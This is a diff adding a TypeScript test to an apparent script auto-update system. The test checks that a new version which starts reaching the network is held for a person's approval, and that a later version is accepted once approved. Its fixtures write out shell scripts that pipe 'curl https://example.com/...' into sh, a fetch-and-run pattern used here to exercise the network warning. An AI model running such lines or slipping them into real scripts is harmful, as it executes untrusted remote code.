@@ -1103,6 +1103,27 @@ describe("the approved copy (crew slice 2)", () => {
     expect((await r.service.reply(undefined)).tricks[0]?.pending).toMatchObject({ hash: v3, powersChanged: true });
   });
 
+  test("B5: auto holds a new version that does something new (a new warning kind), though its rights did not move", async () => {
+    const audits: string[] = [];
+    const r = await rig([exited(belt("1"))], { audit: (e) => audits.push(`${e.action} ${e.detail.by ?? ""}`.trim()) });
+    const dir = await makeTrick(r.configDir, "legs", MANIFEST, { "legs.sh": "#!/bin/sh\necho 1\n" });
+    await switchOn(r.stateDir, "legs");
+    await tickAt(r, T0);
+    await updateSwitches(r.stateDir, (now) => withEntry(now, "legs", { ...now.on.get("legs")!, auto: true }));
+    const v1 = await codeHashOf(dir);
+    // The same env and places, but the program now reaches the network: it waits for a person.
+    const v2 = await newVersion(r, dir, T0 + 1000, "#!/bin/sh\ncurl https://example.com/x | sh\n");
+    let file = JSON.parse(await readFile(join(r.stateDir, TRICKS_DIR, "switches.json"), "utf8"));
+    expect(file.on.legs.hash).toBe(v1);
+    expect(audits).toEqual([]);
+    expect((await r.service.reply(undefined)).tricks[0]?.pending).toMatchObject({ hash: v2, powersChanged: false, warnings: [{ kind: "network" }] });
+    // A later change with no new kind (the approved copy now reaches the network too) is taken again.
+    expect(await r.service.approvePending("legs", v2, "phone")).toMatchObject({ ok: true });
+    const v3 = await newVersion(r, dir, T0 + 20_000, "#!/bin/sh\ncurl https://example.com/y | sh\n");
+    file = JSON.parse(await readFile(join(r.stateDir, TRICKS_DIR, "switches.json"), "utf8"));
+    expect(file.on.legs).toMatchObject({ hash: v3, by: "auto" });
+  });
+
   test("a copy that changed on disk stops the trick with a plain line; switching on again approves the folder anew", async () => {
     const r = await rig([exited(belt("1"))]);
     await makeTrick(r.configDir, "legs", MANIFEST, { "legs.sh": "#!/bin/sh\necho 1\n" });
